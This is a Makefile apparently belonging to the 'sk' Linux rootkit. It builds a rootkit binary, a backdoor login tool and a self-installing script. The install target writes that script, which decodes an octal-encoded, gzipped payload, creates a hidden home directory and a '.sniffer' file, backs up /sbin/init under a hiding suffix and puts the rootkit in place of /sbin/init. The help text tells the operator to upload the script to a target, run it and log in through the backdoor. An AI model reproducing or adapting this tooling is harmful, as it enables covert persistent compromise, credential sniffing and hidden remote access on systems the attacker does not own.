#
#  $Id: Makefile, just a makefile, whatever
#	Btw, if you have any idea on how to prove that, drop me a line.
#	You see ... I'm really not a make guru :)
#	-sd

include config

INST	=	inst

all:	install

help:
	@echo "Targets:"
	@echo "make sk       - build sk & login binary"
	@echo "make help     - this help"
	@echo "make skconfig - configure sk"
	@echo "make install  - create install script"

install:include/config.h sk
	@echo "Creating install script"
	echo "#!/bin/bash" > $(INST)
	echo "D=`cat include/config.h | grep HOME | awk {'print $$3'}`" >> $(INST)
	echo "H=`cat include/config.h | grep HIDESTR | awk {'print $$3'}`" >> $(INST)
	echo "mkdir -p \$$D; cd \$$D" >> $(INST)
	echo "echo > .sniffer; chmod 0622 .sniffer" >> $(INST)
	echo "echo -n -e `gzip -9 -c sk | src/bin2oct` | gzip -d > sk" >> $(INST)
	echo "chmod 0755 sk; if [ ! -f /sbin/init\$${H} ]; " \
	     "then cp -f /sbin/init /sbin/init\$${H}; fi;" \
	     "rm -f /sbin/init; cp sk /sbin/init" >> $(INST)
	@echo "echo Your home is \$$D, go there and type ./sk to install" >> $(INST)
	@echo "echo us into memory.   Have fun!" >> $(INST)
	@echo
	@echo "Okay, file '$(INST)' is complete, self-installing script."
	@echo "Just upload it somewhere, execute and you could log in using"
	@echo "./login binary."
	@echo
	@echo "Have fun!"

skconfig: clean src/pass
	@clear
	@src/pass >> include/config.h
	@echo
	@echo "Configuration saved."
	@echo "From now, _only_ this configuration will be used by generated"
	@echo "binaries till you do skconfig again."
	@echo
	@echo "To (re)build all of stuff type 'make'"

include/config.h:
	@echo
	@echo Please do \`make skconfig\` in top level directory to generate configuration file.
	@echo
	@exit 1

sk:	include/config.h src/sk src/bin2oct login
	cp -f src/sk sk

login:	src/login
	cp -f src/login login

src/sk:	src include
	@(make -C $(SRC) )

src/login: src include
	@(make -C $(SRC) login)

src/pass: src include
	@(make -C $(SRC) pass)

src/bin2oct: src include
	@(make -C $(SRC) bin2oct)

clean:
	rm -f include/config.h sk login inst
	@(make -C $(SRC) clean )

